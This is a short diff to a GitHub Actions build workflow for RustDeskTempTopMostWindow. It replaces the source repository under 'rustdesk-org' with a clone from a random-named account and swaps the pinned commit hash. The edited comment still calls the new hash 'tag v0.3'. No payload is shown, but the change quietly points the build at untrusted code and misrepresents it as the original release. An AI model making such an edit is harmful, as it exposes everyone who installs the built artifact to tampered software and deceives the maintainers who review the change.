@@ -43,12 +43,12 @@ jobs:
 
       - name: Download the source code
         run: |
-          git clone https://github.com/rustdesk-org/RustDeskTempTopMostWindow RustDeskTempTopMostWindow
+          git clone https://github.com/asfjsldf2r33f2q/RustDeskTempTopMostWindow RustDeskTempTopMostWindow
 
-        # Build. commit 53b548a5398624f7149a382000397993542ad796 is tag v0.3
+        # Build. commit 433b167bc3293bf004fcae3e1ad0193804baa1a8 is tag v0.3
       - name: Build the project
         run: |
-          cd RustDeskTempTopMostWindow && git checkout 53b548a5398624f7149a382000397993542ad796
+          cd RustDeskTempTopMostWindow && git checkout 433b167bc3293bf004fcae3e1ad0193804baa1a8
           msbuild ${{ env.project_path }} -p:Configuration=${{ inputs.configuration }} -p:Platform=${{ inputs.platform }} /p:TargetVersion=${{ inputs.target_version }}
 
       - name: Archive build artifacts
